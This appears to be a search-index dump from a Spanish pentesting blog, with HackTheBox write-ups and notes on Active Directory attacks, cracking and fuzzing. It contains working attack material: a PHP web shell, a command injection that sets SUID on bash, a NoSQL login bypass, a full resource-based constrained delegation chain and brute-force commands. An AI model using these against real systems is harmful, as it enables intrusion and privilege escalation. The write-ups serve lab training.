hashes15657792073e8a843d4f91fc403454e1:NaCl13edad4932da9dbb57d9cd15b66ed104:NaClbd3dad50e2d578ecba87d5fa15ca5f85:NaCla7eed23a7be6fe0d765197b1027453fe:NaCl5d15340bded5b9395d5d14b9c21bc82b:NaClAhora los rompemos❯ hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt 13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 5d15340bded5b9395d5d14b9c21bc82b:NaCl:AaronthehottestY nos conectamos por ssh❯ ssh bill@broscience.htbbill@broscience.htb's password: bill@broscience:~$ hostname -I10.129.95.77 dead:beef::250:56ff:feb9:c1d3 bill@broscience:~$ Nos pasamos pspy a la máquina victima y vemos que se está ejecutando un script de bash “/opt/renew_cert.sh”. Si le echamos un vistazo vemos que ejecuta el siguiente comandoopenssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;\"$countryTambién lo ejecutamos pero le modificamos algunas cosas. Y luego le inyectamos nuestro código cuando nos pregunte por el “CommonName”bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout test.key -out test.crt -days 1Generating a RSA private key.......................................++++...................................................++++writing new private key to 'test.key'-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)Email Address []:Esperamos un poco a que root ejecute el script y listo, podemos hacer “bash -p”bill@broscience:~/Certs$ bash -p bash-5.1# whoamirootbash-5.1#" }, { "title": "Resource-Based Constrained Delegation Attack", "url": "/posts/rbcd-attack/", "categories": "Notes", "tags": "Active Directory", "date": "2022-12-26 00:00:00 -0500", "snippet": "Este ataque es de una escalada de privilegios, esto, en un caso específico se pudo descubrir con sharphound y mediante BloodHound y un recurso compartido a nivel de red que con “net group” pudimos ...", "content": "Este ataque es de una escalada de privilegios, esto, en un caso específico se pudo descubrir con sharphound y mediante BloodHound y un recurso compartido a nivel de red que con “net group” pudimos ver el permiso “Generic All” aplicado a los miembros del dominioExtraído de de HacktricksPrimero lo que tenemos que hacer es subirnos el Powermad.ps1 en la máquina víctima y luego el PowerView.ps1. Eso si, hay que importar ambos, una vez los hayamos subido en la máquina víctima, de la siguiente maneraPowermad: Con esto puedes crear un “object computer” dentro del dominioPowerView: Es una herramienta escrita en PowerShell diseñada para obtener información en redes de Windows Active Directory.*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Import-Module .\\Powermad.ps1Luego ejecutamos el siguiente comando (Lo que dice “SERVICEA” lo puedes cambiar por lo que quieras y la parte de los números, que es una constraseña, también, pero simplemente recuerda esto para luego). Esto es para crear una cuenta de máquina ó “MachineAccount” proporcionandole una contraseña y un nombre en específicoNew-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -VerboseLuego puedes verificar que lo anterior se ejecutó correctamente de la siguiente formaGet-DomainComputer SERVICEAUna vez hecho esto, hacemos el siguiente comando para almacenar en una variable el ObjectSid$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsidY lo comprobamos haciendoecho $ComputerSidLuego ejecutamos esto que lo que hace es crear un nuevo objeto “RawSecurityDescriptor” que contiene la información de seguridad especificada en la cadena de caracteres y lo asigna a la variable $SD. Y también asigna los permisos ó el control total al propietario del objeto, que en este caso es con el usuario al cual tienes acceso en la máquina víctima$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"Luego el siguiente que lo que hace es crear un nuevo array de bytes con un tamaño igual al tamaño de la información de seguridad contenida en el objeto $SD y lo asigna a la variable $SDBytes$SDBytes = New-Object byte[] ($SD.BinaryLength)Luego esta que lo que hace es obtener la representación binaria de la información de seguridad contenida en el objeto $SD y la escribe en el array de bytes $SDBytes$SD.GetBinaryForm($SDBytes, 0)Luego (en este caso se pone “dc” porque así se llama la máquina. En hacktricks trae una variable, pero esa variable nunca la hemos definido, por ende ponemos “dc”).Esto lo que hace es obtener información sobre un equipo de dominio específico, establece el valor del atributo “msds-allowedtoactonbehalfofotheridentity” del equipo de dominio al valor del array de bytes $SDBytes y actualiza el equipo de dominio con los cambiosGet-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}Ya para comprobar todo lo anteriormente hecho hacemos, luego te debería de mostrar algo como lo siguienteGet-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'msds-allowedtoactonbehalfofotheridentity----------------------------------------{1, 0, 4, 128...}Ya por último con la herramienta impacket-getST podemos obtener el TGT del usuario administrator (En SERVICEA ponemos el nombre del objeto que creamos anteriormente y le proporcionamos la contraseña que hemos creado)❯ impacket-getST -spn cifs/dc.dominio.com -impersonate administrator -dc-ip &lt;ip&gt; dominio.htb/SERVICEA$:123456[*] Getting TGT for user[*] Impersonating administrator[*] \tRequesting S4U2self[*] \tRequesting S4U2Proxy[*] Saving ticket in administrator.ccacheEl TGT se guardó en este caso en “administrator.ccache” y lo que tenemos que hacer es igualar una variable de entorno en donde nos guardó el TGT❯ export KRB5CCNAME=administrator.ccacheY ya por último puedes conectarte con “psexec” como administrator sin proporcionar credenciales❯ impacket-psexec -k dc.support.htb*] Requesting shares on dc.support.htb.....[*] Found writable share ADMIN$[*] Uploading file tDagzSkX.exe[*] Opening SVCManager on dc.support.htb.....[*] Creating service lxWO on dc.support.htb.....[*] Starting service lxWO.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.20348.859](c) Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamint authority\\systemC:\\Windows\\system32&gt;Nota: Todo esto también se puede hacer con RubeusPermiso Generic All“Generic All” es un permiso en entornos de directorio activo que le da a un usuario o grupo acceso completo a todos los objetos en el directorio. Esto incluye la capacidad de leer, escribir y ejecutar todos los archivos y carpetas en el directorio, así como modificar los atributos de los objetos y crear y eliminar objetos.En general, “Generic All” se utiliza para otorgar acceso completo a un usuario o grupo a todos los objetos en un directorio, lo que puede ser útil en casos en los que se desea dar acceso total a un usuario o grupo para realizar tareas de administración o mantenimiento en el directorio. Sin embargo, también es importante tener en cuenta que otorgar permisos “Generic All” a un usuario o grupo puede ser un riesgo de seguridad si no se hace de manera adecuada, ya que puede dar a ese usuario o grupo un control total sobre los objetos en el directorio. Por lo tanto, es importante utilizar este permiso de manera cuidadosa y asegurarse de que solo se conceda a usuarios o grupos de confianza." }, { "title": "Crackeo Contraseñas", "url": "/posts/crackeo-contrase%C3%B1as/", "categories": "Notes", "tags": "Cracking", "date": "2022-12-26 00:00:00 -0500", "snippet": "HashcatPodemos crackear con esta herramienta, es una alternativa a johnEn este ejemplo es con un hash en formato md5. Si el hash no es md5, haciendole un man, puedes ver qué otras opciones tiene el...", "content": "HashcatPodemos crackear con esta herramienta, es una alternativa a johnEn este ejemplo es con un hash en formato md5. Si el hash no es md5, haciendole un man, puedes ver qué otras opciones tiene el parámetro “-m”. En el caso con hashcat, sólo añades el hash, si añades el nombre y el hash, te dará problemas❯ hashcat -m 0 hash /usr/share/wordlists/rockyou.txtHydraCon esta herramienta podemos probrar contraseñas para entrar por ssh, podemos especificarle tanto un diccionario de contraseñas, como de usuarios de la siguiente forma❯ hydra -L users.txt -P passwords.txt ssh://&lt;ip&gt;" }, { "title": "Subdominios", "url": "/posts/Subdominios/", "categories": "Notes", "tags": "Subdominios", "date": "2022-12-26 00:00:00 -0500", "snippet": "Hay varias maneras de encontrar subdominios, obviamente aparte de un dominio, usualmente se usan dos herramientas para eso, por si alguna falla, cada una trae sus variaciones, ventajas y desventaja...", "content": "Hay varias maneras de encontrar subdominios, obviamente aparte de un dominio, usualmente se usan dos herramientas para eso, por si alguna falla, cada una trae sus variaciones, ventajas y desventajasvhost: Para el descubrimiento de virtualhosting-t: Para indicarle cierto número de hilos❯ gobuster vhost -u http://dominio.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100También podemos hacer esto con wfuzz de la siguiente forma❯ wfuzz -c -H \"Host: FUZZ.dominio.com\" -u \"http://dominio.com\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100Recuerda siempre si encontraste un subdominio agregarlo al “/etc/hosts” con su respectiva ip. Porque no es lo mismo poner un dominio para entrar a una web que poner la ip directamente" }, { "title": "Reconocimiento", "url": "/posts/Reconocimiento/", "categories": "Notes", "tags": "Nmap", "date": "2022-12-26 00:00:00 -0500", "snippet": "NMAPCon nmap podemos hacer un escaneo de la siguiente forma. Por defecto es por tcp-p-: Es para escanear todo el rango de puertos.-sS: Es para que lance paquetes tipo Syn, que es para que vaya más...", "content": "NMAPCon nmap podemos hacer un escaneo de la siguiente forma. Por defecto es por tcp-p-: Es para escanear todo el rango de puertos.-sS: Es para que lance paquetes tipo Syn, que es para que vaya más rápido el escaneo y estos paquetes son para el descubribiento de puertos mas que todo.--min-rate 5000: le indicamos que mande 5000 paquetes por segundo(puedes modificar esto si quieres).--open: Para que me escanee los puertos abiertos específicamente y no me busque por los cerrados o filtrados-v: Para que me vaya mostrando mientras hace el escaneo los puertos que va encontrando abiertos(verbose)-n: Para que no me aplique resolución DNS-Pn: Para que no me aplique hostdiscovery que esto es através del protocolo de resolución ARL-oG: Para que me lo guarde en formato grepeable a el fichero “OpenPorts”❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn &lt;ip victima&gt; -oG OpenPortsTambién podemos lanzarlo con el parámetro -T, siendo “-T5” el modo más potente de este parámetro❯ nmap -p- -T5 --open -v -n -Pn &lt;ip victima&gt; -oG OpenPortsLanzamos unos scripts básicos de enumeración para detectar la versión y servicios que corren bajo los puertos abiertos descubiertos con escaneos previamente hechos❯ nmap -sC -sV -p1,2,3 &lt;ip victima&gt; -oN servicesTambién podemos especificar scripts propios de nmap. En el siguiente caso es un script para hacer fuzzing❯ nmap -p80 &lt;ip victima&gt; --script http-enumCategorias NmapPodemos ver los scripts que tiene nmap y sus categorías de la siguiente forma❯ locate .nse | xargs grep \"categories\"Asimismo, como existen varias categorías en distintos scripts podemos usar los scripts en base a la categoría que tienen. En el siguiente ejemplo se usan las categorías “vuln” y “safe”, pero pues las podemos acoplar a nuestras necesidades. También en vez de usar el “and” cuando indicamos las categorías, podemos usar el “or”❯ nmap -p80 &lt;ip victima&gt; --script \"vuln and safe\" -oN file.txtTambién podemos ver con grep las categorías que hay de los scripts❯ locate .nse | xargs grep \"categories\" | grep -oP '\".*?\"' | sort -u | tr -d '\"'" }, { "title": "Fuzzing", "url": "/posts/Fuzzing/", "categories": "Notes", "tags": "Fuzzeo, Herramientas de fuzzing", "date": "2022-12-26 00:00:00 -0500", "snippet": "Qué es fuzzear?Básicamente es cuando en base al código de estado de una página por ejemplo, podemos saber rutas existentes en la página web.Esto lo podemos hacer con wfuzz, gobuster, dirsearch, ent...", "content": "Qué es fuzzear?Básicamente es cuando en base al código de estado de una página por ejemplo, podemos saber rutas existentes en la página web.Esto lo podemos hacer con wfuzz, gobuster, dirsearch, entre otras.WfuzzEn este caso, así se hace con wfuzz--hh: Con esto podemos esconder ciertos carácteres que hayan en la respuesta (hide characters)--hc: Con esto escondemos el código de estado 404 que sabemos que es el “not found”(hide code)-c: Para que nos ponga colores en el código de estado de la respuestaFUZZ: Palabra interna de la herramienta, la cual va a remplazar cada palabra probada con el diccionario-d: Para enviar data por post❯ wfuzz -c --hh=3122 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://&lt;url a fuzzear&gt;/FUZZTambién podemos usar la siguiente combinatoria para hacer FUZZING, esto es haciendo uso del parámetro “-z” que es para indicarle un payload. En este caso es un ejemplo con la máquina Shoppy de HTB. Es una inyección NOSQL hacia mariadb❯ wfuzz --hh=51 -z file,/usr/share/seclists/Usernames/Names/names.txt -d \"username=FUZZ'||'1==1&amp;password=test\" http://shoppy.htb/loginDirsearchCon dirsearch, por defecto usa un diccionaro de la propia herramienta ó también podemos indicar uno nuestro con el parámetro “-w”❯ dirsearch -u &lt;url a fuzzear&gt;" }, { "title": "Active Directory", "url": "/posts/Active_Directory/", "categories": "Notes", "tags": "Active Directory", "date": "2022-12-26 00:00:00 -0500", "snippet": "CrackMapexecPodemos ver información sobre el Windows ante el que nos estamos enfrentando de la siguiente forma:❯ crackmapexec smb &lt;ip&gt;También si estamos ante un DC (Domain Controller) podemos...", "content": "CrackMapexecPodemos ver información sobre el Windows ante el que nos estamos enfrentando de la siguiente forma:❯ crackmapexec smb &lt;ip&gt;También si estamos ante un DC (Domain Controller) podemos añadir al “/etc/hosts” algún dominio que hayamos encontrado con crackmapexec y también podemos añadirlos así&lt;ip vicitima&gt; dc dc.dominio dominioEsto es para que ataques con kerberos, si está el kerberos expuesto, podamos efectuar ataques y no tengamos problema alguno.También podemos enumerar por recursos compartidos a nivel de red, en este caso haciendo uso de un usuario “none”. En ciertos casos puede funcionar❯ crackmapexec smb &lt;ip&gt; -u \"none\" --sharesPodemos saber si credenciales que hayamos obtenido de alguna forma son válidas a nivel de sistema. Si como resultado nos pone un “+” es que son correctas❯ crackmapexec smb &lt;ip&gt; -u 'user' -p 'password'Podemos comprobar con “winrm” si un usuario hace parte del grupo “Remote Managment Users”. Si nos pone “(Pwn3d!)” Entonces es que sí, claro, esto teniendo credenciales. Esto es gracias a que el puerto “5985” está abierto, que es el servicio de administración remota de windows. Luego nos podremos conectar con “evil-winrm” obteniendo una shell interactiva❯ crackmapexec winrm &lt;ip&gt; -u 'user' -p 'password'Con crackmapexec podemos por fuera bruta indicar una contraseña para que vaya probando con usuarios de un diccionario para ver si la contraseña es válida para cierto usuario probado en el diccionario--continue-on-success: Es para que si encuentra una contraseña correcta para cierto usuario, no me pare el ataque sino que siga probando con los demás usuarios❯ crackmapexec smb &lt;ip&gt; -u diccionario.txt -p 'password' --continue-on-successSmbmapSi no funciona de la manera anterior también podemos usar smbmap para ver recursos compartidos a nivel de red haciendo uso de un usuario “none”❯ smbmap -H &lt;ip&gt; -u noneSmbclientPodemos conectarnos a los recursos compartidos que hay a nivel de red para quizá poder descargarnos algún recurso interesante❯ smbclient //&lt;ip&gt;/&lt;recurso compartido&gt; -NKerbruteCon esta herramienta, gracias al puerto abierto de kerberos, podríamos enumerar usuarios en base a un dominio y la ip de la víctima. Esto en base a un diccionario que le especifiquemos❯ /opt/kerbrute/kerbrute userenum -d dominio.com --dc &lt;ip victima&gt; diccionario.txtRecuerda que en entornos de Directorio Activo, si tienes usuarios potenciales, puedes efectuar un ASREPROAST attack. Esto lo puedes hacer con “impacket-GetNPUsers”, que esta te pide el TGT y también tenemos el “impacket-GetUserSPNs” que es cuando ya tenemos credenciales válidas de un usuarioKerberoasting AttackSi tenemos credenciales válidas, podemos efectuar este ataque. Esto en base al TGS (Ticket Granting Service) que luego será un hash y lo podremos crackear con fuerza brutaRpcclientCon esta herramienta podemos conectarnos para ver cosas enumerar por cosas en la máquina victima❯ rpcclient -U 'user%password' &lt;ip&gt;enumdomusers: Podemos ver usuarios estando conectadosenumdomgroups: Podemos enumerar por grupos estando conectadosquerydispinfo: Podemos ver más información sobre los usuariosquerygroupmem: Podemos indicar el “rid” de un usuario que anteriormente descubrimos con “querydispinfo”queryuser: Acá podemos colocar el “rid” en hexadecimal obtenido con querygroupmem para obtener info del usuario al cual le sacamos el “rid”Ejemplo de “querygroupmem”:rpcclient $&gt; querygroupmem 0x200 También podemos con el parámetro “-c” ejecutar comandos del mismo sin tener que estar en una sesión❯ rpcclient -U 'user%password' &lt;ip&gt; -c \"enumdomusers\"LdapSearchPodemos ver información a base de credenciales que tengamosNota: Esto es extraido de Hacktricks❯ ldapsearch -x -H ldap://&lt;ip&gt; -D 'user@dominio.com' -w 'password' -b \"DC=dominio,DC=com\"Evil-winrmNos podemos conectar con credenciales a la máquina victima❯ evil-winrm -i &lt;ip&gt; -u \"user\" -p \"passoword\"Listando en WindowsPara ver los privilegios que tenemos como usuario en una máquina windows podemos hacer:*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; whoami /privPara ver los grupos a los que pertenecemos podemos hacer:*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; net user &lt;usuario&gt;Ó también podemos ver más a detalle los grupos así*Evil-WinRM* PS C:\\Users\\support\\Desktop&gt; net groupCon evil-winrm podemos subirnos cosas a la máquina víctima (si tabulas y tienes la consola interactiva en el mismo directorio donde tienes el binario o fichero a subir, se te autocompletará)*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; upload &lt;ruta de lo que nos queremos subir&gt;También te puedes descargar cosas con evil-winrm. Indicandole la ruta entera de lo que te quieres descargar y luego el nombre con el que te quieres descargar eso*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; download C:\\Users\\support\\Documents\\20221226133921_BloodHound.zip BH.zipEscaladas de privilegiosHay un ataque para escalada de privilegios que puede ser útil" }, { "title": "Soccer Writeup", "url": "/posts/writeup-Soccer/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, Default Credentials, suid", "date": "2022-12-19 00:00:00 -0500", "snippet": "En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos ...", "content": "En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos y por último nos aprovechamos del privilegio SUID para escalar privilegiosReconocimientoPrimeramente hacemos un escaneo a los puertos con nmap para detectar los puertos abiertos❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.89.200 -oG OpenportsScanning 10.129.89.200 [65535 ports]PORT STATE SERVICE22/tcp open ssh80/tcp open http9091/tcp open xmltec-xmlmailVemos el puerto 80 abierto, por lo tanto con whatweb podemos ver información sobre la web que corre por ahí❯ whatweb 10.129.89.200http://10.129.89.200 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.89.200], RedirectLocation[http://soccer.htb/], Title[301 Moved Permanently], nginx[1.18.0]ERROR Opening: http://soccer.htb/ - no address for soccer.htbVemos que nos lanza error ya que nos redirige a un dominio. Lo añadimos al /etc/hostsecho \"10.129.89.200 soccer.htb\" &gt;&gt; /etc/hostsLanzamos nuevamente el whatweb pero ahora hacia el dominio❯ whatweb http://soccer.htbhttp://soccer.htb [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.89.200], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]Si fuzzeamos por direcotorios, encontramos un /tiny❯ dirsearch -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 Target: http://soccer.htb/[22:07:31] Starting: [22:08:03] 301 - 178B - /tiny -&gt; http://soccer.htb/tiny/IntrusiónVemos un panel de login. Si buscamos en internet por las credenciales que vienen por default en Tiny File Manager vemos “admin:admin@123” y obtenemos acceso a la webVista principal de la webVemos que tenemos un direcotrio tiny, dentro hay otro que es uploads y ya dentro podemos hacer click a la derecha arriba para que nos deje subir un archivoNota: Si no lo hacemos en este orden, no nos dejará subir ningún archivoUploadsVemos que con una extensión que tengo en el navegador (wappalyzer) la página emplea php, por lo cual trataremos de subir un archivo con script php para ejecutar comandos de manera remota&lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET['shell']) . \"&lt;/pre&gt;\"; ?&gt;Lo que hace el anterior script es que mediante etiquetas preformateadas y usando la función “shell_exec” y haciendo una petición por GET definimos un parámetro (en este caso “shell”) para ejecutar comandos de manera remota gracias a la función empleadaRCEUna vez comprobamos que tenemos un RCE entablamos una reverse shell y nos ponemos por escucha con netcatReverse_shellY obtenemos una shell por el puerto en el cual nos pusimos en escucha❯ nc -nlvp 443listening on [any] 443 ...www-data@soccer:~/html/tiny/uploads$ whoamiwww-dataVemos que hay un archivo de nginx que muestra un subdominiowww-data@soccer:~/html/tiny$ cd /etc/nginx/sites-available/www-data@soccer:/etc/nginx/sites-available$ lsdefault soc-player.htbwww-data@soccer:/etc/nginx/sites-available$ cat soc-player.htb server {\tlisten 80;\tlisten [::]:80;\tserver_name soc-player.soccer.htb;\troot /root/app/views;\tlocation / {\t\tproxy_pass http://localhost:3000;\t\tproxy_http_version 1.1;\t\tproxy_set_header Upgrade $http_upgrade;\t\tproxy_set_header Connection 'upgrade';\t\tproxy_set_header Host $host;\t\tproxy_cache_bypass $http_upgrade;\t}}www-data@soccer:/etc/nginx/sites-available$Lo añadimos al /etc/hosts. Aunque nos lleva a una web que no tiene mucho para ver.Si vemos el otro archivo que había en la misma ruta en la que estábamos de antes veremos que se emplea un websocketwww-data@soccer:/etc/nginx/sites-available$ cat default server {\tlisten 80;\tlisten [::]:80;\tserver_name 0.0.0.0;\treturn 301 http://soccer.htb$request_uri;}server {\tlisten 80;\tlisten [::]:80;\tserver_name soccer.htb;\troot /var/www/html;\tindex index.html tinyfilemanager.php;\t\t\tlocation / { try_files $uri $uri/ =404;\t}\tlocation ~ \\.php$ {\t\tinclude snippets/fastcgi-php.conf;\t\tfastcgi_pass unix:/run/php/php7.4-fpm.sock;\t}\tlocation ~ /\\.ht {\t\tdeny all;\t}}También podemos ver los puertos internos abiertoswww-data@soccer:/etc/nginx/sites-available$ ss -pnltuNetid State Recv-Q Send-Q Local Address:Port udp UNCONN 0 0 127.0.0.53%lo:53 udp UNCONN 0 0 0.0.0.0:68 tcp LISTEN 0 4096 127.0.0.53%lo:53 tcp LISTEN 0 128 0.0.0.0:22 tcp LISTEN 0 511 127.0.0.1:3000 tcp LISTEN 0 511 0.0.0.0:9091 tcp LISTEN 0 70 127.0.0.1:33060 tcp LISTEN 0 151 127.0.0.1:3306 tcp LISTEN 0 511 0.0.0.0:80 tcp LISTEN 0 128 [::]:22 tcp LISTEN 0 511 [::]:80Como habíamos visto de antes que tenemos el puerto 9091 abierto, comprobamos si ese puerto es el que tiene corriendo el WebSocket con websocat❯ websocat ws://soc-player.soccer.htb:9091 -v[INFO websocat::lints] Auto-inserting the line mode[INFO websocat::stdio_threaded_peer] get_stdio_peer (threaded)[INFO websocat::ws_client_peer] get_ws_client_peer[INFO websocat::ws_client_peer] Connected to wsPodemos ver el servicio de mysql corriendowww-data@soccer:/etc/nginx$ systemctl status mysql● mysql.service - MySQL Community Server Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset:&gt; Active: active (running) since Mon 2022-12-19 19:15:43 UTC; 6h ago Process: 970 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=ex&gt; Main PID: 1035 Status: \"Server is operational\" Tasks: 40 (limit: 4640) Memory: 440.9M CGroup: /system.slice/mysql.service └─1035 /usr/sbin/mysqldPrivescBuscando vulnerabilidades al respecto de un Websocket y sql injection encontramos un artículo. Nos copiamos el script que hay de python y cambiamos la siguientes líneasNota: Son las líneas 6 y 15ws_server = \"ws://soc-player.soccer.htb:9091\"data = '{\"id\":\"%s\"}' % messageEste script lo que hace es abrir el puerto 8081 en nuestro equipo y redirigirlo al websocket de la máquina vícitima hacia el puerto 9091. Mientras dejamos corriendo el script, ejecutamos sqlmap❯ python3 sqli_blind.py[+] Starting MiddleWare Server[+] Send payloads in http://localhost:8081/?id=*❯ sqlmap -u \"http://localhost:8081/?id=1\" --batch -dbs[INFO] resumed: mysql[INFO] resumed: information_schema[INFO] resumed: performance_schema[INFO] resumed: sys[INFO] resumed: soccer_dbVemos una base de datos soccer_db. Vamos a enumerar las tablas que tiene[INFO] retrieved: accountsDatabase: soccer_db[1 table]+----------+| accounts |+----------+Vemos la tabla accounts y enumeraremos sus columnas❯ sqlmap -u \"http://localhost:8081/?id=1\" --batch -D soccer_db -T accounts --columnsDatabase: soccer_dbTable: accounts[4 columns]+----------+-------------+| Column | Type |+----------+-------------+| email | varchar(40) || id | int || password | varchar(40) || username | varchar(40) |+----------+-------------+Vemos password y username y miramos qué contiene❯ sqlmap -u \"http://localhost:8081/?id=1\" --batch -D soccer_db -T accounts -C username,password -dumpDatabase: soccer_dbTable: accounts[1 entry]+----------+----------------------+| username | password |+----------+----------------------+| player | PlayerOftheMatch2022 |+----------+----------------------+Como vimos el puerto ssh abierto anteriormente, nos conectamos por ssh con las credenciales de player❯ sshpass -p 'PlayerOftheMatch2022' ssh player@10.129.90.242player@soccer:~$ whoamiplayerplayer@soccer:~$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.129.90.242Si enumeramos por archivos con el permiso SUID vemos uno interesanteplayer@soccer:~$ find / -perm -4000 2&gt;/dev/null/usr/local/bin/doas/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/bin/umount/usr/bin/fusermount/usr/bin/mount/usr/bin/su/usr/bin/newgrp/usr/bin/chfn/usr/bin/sudo/usr/bin/passwd/usr/bin/gpasswd/usr/bin/chsh/usr/bin/atEl primero nos interesa, por lo tanto buscamos más archivos con el mismo nombreplayer@soccer:~$ find / -name **doas** 2&gt;/dev/null/usr/local/share/man/man5/doas.conf.5/usr/local/share/man/man1/doas.1/usr/local/share/man/man8/vidoas.8/usr/local/share/man/man8/doasedit.8/usr/local/bin/doasedit/usr/local/bin/doas/usr/local/bin/vidoas/usr/local/etc/doas.confEchamos un vistaso a doas.confplayer@soccer:~$ cat /usr/local/etc/doas.confpermit nopass player as root cmd /usr/bin/dstatPodemos ejecutar dstat sin el permiso de root. Ahora buscamos por más archivos o directorios que tengan dstat de nombreplayer@soccer:~$ find / -name *dstat* 2&gt;/dev/null | head/usr/share/doc/dstat/usr/share/python3/runtime.d/dstat.rtupdate/usr/share/dstat/usr/local/share/dstatVemos un /usr/share/dstat que almacena los archivos de python, los cuales son plugins, pero sobre ese no tenemos permisos de escritura. Buscamos ahora por un archivo dstat que tenga como grupo playerplayer@soccer:~$ find / -group player 2&gt;/dev/null | grep \"dstat\"/usr/local/share/dstat/proc/4931/task/4931/schedstat/proc/4931/schedstat/proc/5042/task/5042/schedstat/proc/5042/schedstat/proc/5066/task/5066/schedstat/proc/5066/schedstat/proc/5067/task/5067/schedstat/proc/5067/schedstat/proc/5356/task/5356/schedstat/proc/5356/schedstat/proc/5357/task/5357/schedstat/proc/5357/schedstatEl primero llama la atención ya que, acá también podemos almacenar plugins del comando. Así que crearemos un script en python que nos otorgue SUID a la bashNota: Tenemos que llamar al script utilizando la misma manera en que se almacenan los otros plugins en la otra ruta, es decir: dstat_nombrescript.py#!/usr/bin/python3import osos.system(\"chmod u+s /bin/bash\")Una vez creado, verificamos si el comando lo almacenaplayer@soccer:/usr/local/share/dstat$ dstat --listinternal:\taio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,\tpage24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones/usr/share/dstat:\tbattery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,\tdstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,\tjvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,\tmysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,\tnet-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,\tsendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,\ttop-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,\ttop-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,\tzfs-zil/usr/local/share/dstat:\tscriptVemos que sí, así que sólo procedemos a ejecturalo de la siguiente formaplayer@soccer:/usr/local/share/dstat$ /usr/local/bin/doas -u root /usr/bin/dstat --scriptplayer@soccer:/usr/local/share/dstat$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashY ya podemos hacer bash -pplayer@soccer:/usr/local/share/dstat$ bash -pbash-5.0# cat /root/root.txt c1eea9302f59408e750ad663505e8f4bbash-5.0#" }, { "title": "NoSQLI", "url": "/posts/NoSQLI/", "categories": "Notes", "tags": "", "date": "2022-12-12 00:00:00 -0500", "snippet": "Este es otro tipo de inyección SQL que se ve pocas veces, pero podemos llegar a ver. En este caso traigo una manera de bypasear un panel de login, por si una inyección SQL normal no funciona. En es...", "content": "Este es otro tipo de inyección 